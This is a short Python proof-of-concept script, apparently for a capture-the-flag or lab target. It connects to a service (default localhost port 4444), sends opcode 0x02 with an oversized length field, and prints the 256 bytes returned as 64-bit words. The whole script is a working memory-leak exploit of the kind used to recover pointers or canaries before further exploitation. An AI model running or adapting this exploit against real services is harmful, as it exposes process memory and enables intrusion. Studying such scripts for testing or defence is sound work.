#!/usr/bin/env python3
import socket, struct, sys

HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 4444

s = socket.create_connection((HOST, PORT))
s.sendall(bytes([0x02]) + struct.pack(">I", 256))
leak = b""
while len(leak) < 256:
    c = s.recv(256 - len(leak))
    if not c:
        break
    leak += c
s.close()

print("leaked %d bytes" % len(leak))
for off in range(0, len(leak), 8):
    chunk = leak[off:off+8]
    if len(chunk) < 8:
        print("%3d  (short) %s" % (off, chunk.hex()))
        continue
    v = int.from_bytes(chunk, "little")
    print("%3d  %016x" % (off, v))
